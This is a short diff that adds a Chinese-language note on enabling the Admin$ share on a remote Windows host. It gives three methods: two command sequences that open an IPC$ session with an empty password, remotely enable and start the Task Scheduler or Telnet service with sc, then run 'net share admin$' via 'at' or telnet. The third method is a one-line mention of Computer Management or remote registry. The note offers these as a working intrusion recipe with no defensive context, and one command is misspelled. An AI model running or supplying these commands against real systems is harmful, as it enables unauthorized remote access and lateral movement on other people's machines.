@@ -1,0 +1,18 @@
+在远程主机开启Admin$共享
+
+方法一:
+net use \\host\ipc$ "" /user:admin
+sc \\ip config schedule start= auto
+sc \\ip start schedule
+at \\ip "TIME" "cmd /c net share admin$"
+
+方法二:
+net use \\host\ipc$ "" /user:admin
+sc \\ip config tlntsvr start= auto
+sc \\ip start tlntsvr
+
+telenet ip
+net share admin$
+
+方法三:
+计算机管理或注册表连接
